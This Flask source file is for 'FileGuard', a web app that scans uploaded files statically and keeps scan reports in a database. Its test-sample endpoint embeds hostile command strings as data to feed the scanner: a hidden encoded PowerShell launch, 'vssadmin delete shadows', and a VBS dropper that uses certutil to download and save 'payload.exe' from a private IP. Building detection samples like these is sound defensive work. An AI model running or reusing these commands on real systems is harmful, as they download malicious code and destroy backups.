"""FileGuard - Cloud Computing Suspicious File Analysis Web Application.
Main Flask application and REST API endpoints.
Analyzes files statically via byte-level heuristics. Never executes uploaded files.
"""

import os
import io
import json
from flask import Flask, render_template, request, jsonify, send_file, redirect, url_for
from werkzeug.utils import secure_filename
from werkzeug.exceptions import RequestEntityTooLarge

from config import Config
from database import (
    init_db,
    save_scan,
    get_all_scans,
    get_scan_by_id,
    delete_scan,
    clear_all_scans,
    get_dashboard_stats
)
from analyzer.core import FileAnalyzer

# Initialize Flask application
app = Flask(__name__)
app.config.from_object(Config)

# Ensure data and upload directories exist
os.makedirs(Config.DATA_DIR, exist_ok=True)
os.makedirs(Config.UPLOAD_FOLDER, exist_ok=True)

# Initialize database schema
init_db()

@app.errorhandler(413)
def request_entity_too_large(error):
    """Handle uploads exceeding maximum allowed size."""
    return jsonify({
        'status': 'error',
        'message': f"File exceeds maximum allowed upload limit ({Config.MAX_CONTENT_LENGTH // (1024 * 1024)} MB).",
        'code': 413
    }), 413

@app.errorhandler(500)
def internal_server_error(error):
    """Handle internal errors safely without leaking stack traces."""
    return jsonify({
        'status': 'error',
        'message': "An error occurred while processing the file. The file may be corrupt.",
        'code': 500
    }), 500

@app.context_processor
def inject_global_context():
    """Inject global context into all templates."""
    return {
        'stats': get_dashboard_stats(),
        'config': Config
    }

@app.route('/')
def index():
    """Render main cybersecurity single-page dashboard."""
    return render_template('index.html')

@app.route('/report/<scan_id>')
def report_view(scan_id):
    """Render dedicated report view for a specific scan."""
    report = get_scan_by_id(scan_id)
    if not report:
        return redirect(url_for('index') + '#history')
    return render_template('report.html', report=report)

# ==================== REST API ENDPOINTS ====================

@app.route('/api/stats', methods=['GET'])
def api_stats():
    """Retrieve aggregate telemetry and metrics for dashboard."""
    stats = get_dashboard_stats()
    return jsonify({'status': 'success', 'data': stats})

@app.route('/api/scan', methods=['POST'])
def api_scan():
    """Upload and inspect a suspicious file statically.
    
    Security Guarantee: Files are never executed. Raw bytes are read,
    analyzed against heuristic rules and hashes, and discarded from memory.
    """
    if 'file' not in request.files:
        return jsonify({'status': 'error', 'message': 'No file part in the upload request.'}), 400
        
    uploaded_file = request.files['file']
    
    if uploaded_file.filename == '':
        return jsonify({'status': 'error', 'message': 'No file was selected for analysis.'}), 400
        
    # Preserve original filename for extension/anomaly checks, but sanitize for safety
    raw_filename = uploaded_file.filename
    clean_filename = secure_filename(raw_filename)
    if not clean_filename:
        clean_filename = "unnamed_payload.bin"
        
    try:
        # Read file bytes directly into memory (up to 16 MB limit enforced by Flask)
        file_bytes = uploaded_file.read()
        
        if len(file_bytes) == 0:
            return jsonify({'status': 'error', 'message': 'Uploaded file is empty (0 bytes).'}), 400
            
        # Perform static heuristic analysis (zero execution)
        report = FileAnalyzer.analyze_bytes(file_bytes, raw_filename)
        
        # Persist report in local SQLite database
        save_scan(report)
        
        return jsonify({
            'status': 'success',
            'message': 'File analyzed successfully.',
            'report': report
        })
        
    except Exception as e:
        app.logger.error(f"Error analyzing file: {e}")
        return jsonify({
            'status': 'error',
            'message': f"Analysis failed: {str(e)}"
        }), 500

@app.route('/api/scans', methods=['GET'])
def api_scans():
    """List historical file scan records."""
    search = request.args.get('search', '').strip()
    limit = request.args.get('limit', 100, type=int)
    
    scans = get_all_scans(limit=limit, search=search if search else None)
    return jsonify({'status': 'success', 'scans': scans, 'count': len(scans)})

@app.route('/api/scans/<scan_id>', methods=['GET'])
def api_scan_detail(scan_id):
    """Retrieve full analysis report by scan_id or SHA-256."""
    report = get_scan_by_id(scan_id)
    if not report:
        return jsonify({'status': 'error', 'message': 'Scan report not found.'}), 404
    return jsonify({'status': 'success', 'report': report})

@app.route('/api/scans/<scan_id>/export', methods=['GET'])
def api_export_report(scan_id):
    """Export report as downloadable JSON or formatted text file."""
    report = get_scan_by_id(scan_id)
    if not report:
        return jsonify({'status': 'error', 'message': 'Scan report not found.'}), 404
        
    export_format = request.args.get('format', 'json').lower()
    meta = report['file_metadata']
    filename_base = secure_filename(meta['filename']) or 'scan_report'
    
    if export_format == 'txt':
        # Generate formatted text report
        txt_content = []
        txt_content.append("=" * 72)
        txt_content.append(" " * 20 + "FILEGUARD SECURITY ANALYSIS REPORT")
        txt_content.append("=" * 72)
        txt_content.append(f"Scan ID:        {report['scan_id']}")
        txt_content.append(f"Timestamp:      {report['created_at']}")
        txt_content.append(f"Target File:    {meta['filename']}")
        txt_content.append(f"File Size:      {meta['filesize_formatted']} ({meta['filesize']} bytes)")
        txt_content.append(f"Detected Type:  {meta['detected_type']} ({meta['mime_type']})")
        txt_content.append("-" * 72)
        txt_content.append("CRYPTOGRAPHIC HASHES")
        txt_content.append(f"SHA-256:        {report['hashes']['sha256']}")
        txt_content.append(f"SHA-1:          {report['hashes']['sha1']}")
        txt_content.append(f"MD5:            {report['hashes']['md5']}")
        txt_content.append("-" * 72)
        txt_content.append("THREAT EVALUATION")
        txt_content.append(f"Verdict:        {report['analysis']['verdict'].upper()}")
        txt_content.append(f"Threat Score:   {report['analysis']['risk_score']} / 100")
        txt_content.append(f"Shannon Entropy:{report['entropy']['score']} / 8.00 ({report['entropy']['level']})")
        txt_content.append(f"Summary:        {report['analysis']['summary']}")
        txt_content.append("-" * 72)
        txt_content.append(f"HEURISTIC FINDINGS ({report['analysis']['findings_count']} detected)")
        for idx, finding in enumerate(report['analysis']['findings'], 1):
            txt_content.append(f" [{idx}] {finding['rule_id']}: {finding['title']}")
            txt_content.append(f"     Severity:    {finding['severity']}")
            txt_content.append(f"     Category:    {finding['category']}")
            txt_content.append(f"     Explanation: {finding['explanation']}")
            if 'evidence' in finding and finding['evidence']:
                txt_content.append(f"     Evidence:    {', '.join(finding['evidence'])}")
            txt_content.append("")
        txt_content.append("-" * 72)
        txt_content.append("DISCLAIMER")
        txt_content.append(report['disclaimer']['notice'])
        txt_content.append(report['disclaimer']['limitation'])
        txt_content.append("=" * 72)
        
        output_buffer = io.BytesIO("\n".join(txt_content).encode('utf-8'))
        return send_file(
            output_buffer,
            as_attachment=True,
            download_name=f"FileGuard_{filename_base}_{report['scan_id'][:8]}.txt",
            mimetype='text/plain'
        )
    else:
        # JSON export
        json_buffer = io.BytesIO(json.dumps(report, indent=2).encode('utf-8'))
        return send_file(
            json_buffer,
            as_attachment=True,
            download_name=f"FileGuard_{filename_base}_{report['scan_id'][:8]}.json",
            mimetype='application/json'
        )

@app.route('/api/scans/<scan_id>', methods=['DELETE'])
def api_delete_scan(scan_id):
    """Delete a specific scan record from database."""
    success = delete_scan(scan_id)
    if not success:
        return jsonify({'status': 'error', 'message': 'Scan record not found.'}), 404
    return jsonify({'status': 'success', 'message': 'Scan record removed.'})

@app.route('/api/scans', methods=['DELETE'])
def api_clear_scans():
    """Clear all historical scans."""
    clear_all_scans()
    return jsonify({'status': 'success', 'message': 'Scan history cleared.'})

@app.route('/api/sample/<sample_type>', methods=['POST'])
def api_generate_sample(sample_type):
    """Generate safe, pre-crafted educational test samples for quick testing."""
    sample_catalog = {
        'clean_text': {
            'filename': 'system_health_report.txt',
            'content': b"FileGuard System Health Check\nAll services operational.\nCPU: 12%, Memory: 45%.\nGenerated at 2026-10-29.\n"
        },
        'spoofed_pdf': {
            'filename': 'invoice_urgent_october.pdf',
            'content': b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00This program cannot be run in DOS mode.\r\r\n$Fake PE Binary Payload for Triage Testing"
        },
        'suspicious_script': {
            'filename': 'sync_backup.ps1',
            'content': b"# Backup launcher\npowershell -w hidden -nop -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==\nvssadmin delete shadows /all /quiet\n"
        },
        'double_extension': {
            'filename': 'quarterly_bonus_sheet.xlsx.vbs',
            'content': b"' Bonus spreadsheet dropper simulation\nSet WshShell = CreateObject(\"Wscript.Shell\")\nWshShell.Run \"cmd.exe /c certutil.exe -urlcache -split -f http://192.168.1.105:8080/payload.exe %TEMP%\\test.exe\", 0, False\n"
        }
    }
    
    if sample_type not in sample_catalog:
        return jsonify({'status': 'error', 'message': 'Invalid sample type specified.'}), 400
        
    sample = sample_catalog[sample_type]
    report = FileAnalyzer.analyze_bytes(sample['content'], sample['filename'])
    save_scan(report)
    
    return jsonify({
        'status': 'success',
        'message': f"Sample '{sample['filename']}' analyzed.",
        'report': report
    })

@app.route('/healthz')
def healthz():
    """Health check endpoint for cloud load balancers and Render uptime checks."""
    return jsonify({
        'status': 'healthy',
        'app': Config.APP_NAME,
        'version': Config.APP_VERSION,
        'environment': Config.ENVIRONMENT
    }), 200

if __name__ == '__main__':
    # Determine debug state (disabled by default in production)
    is_debug = os.environ.get('FLASK_DEBUG', 'true' if Config.ENVIRONMENT == 'development' else 'false').lower() in ('true', '1', 't')

    # Print clean startup banner
    print("=" * 65)
    print("  FileGuard - Suspicious File Analysis Cloud Platform")
    print(f"  Version: {Config.APP_VERSION} | Environment: {Config.ENVIRONMENT.capitalize()}")
    print(f"  Web Server: http://{Config.HOST}:{Config.PORT}")
    print("=" * 65)
    print("  * Static byte-level heuristics active")
    print("  * Upload limit: 16 MB")
    print(f"  * Local SQLite storage: {Config.DATABASE_PATH}")
    print("  * NEVER executes uploaded files")
    print("=" * 65)

    app.run(host=Config.HOST, port=Config.PORT, debug=is_debug)

